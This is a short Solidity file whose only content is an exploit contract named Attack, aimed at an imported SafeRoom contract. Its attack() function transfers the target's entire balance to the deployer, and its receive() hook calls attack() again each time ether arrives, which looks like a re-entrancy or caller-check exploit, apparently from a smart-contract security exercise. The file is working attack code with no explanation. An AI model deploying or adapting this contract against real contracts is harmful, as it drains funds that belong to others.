// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;


import "./SafeRoom.sol";
contract Attack {
    address payable public owner;
    SafeRoom safeRoom;

    constructor (SafeRoom _safeRoom) {
        safeRoom = SafeRoom(_safeRoom);
        owner = payable(msg.sender);
    }

    function attack () public {
        safeRoom.transfer(owner, address(safeRoom).balance);
    }

    receive () external payable{
        attack();
    }

}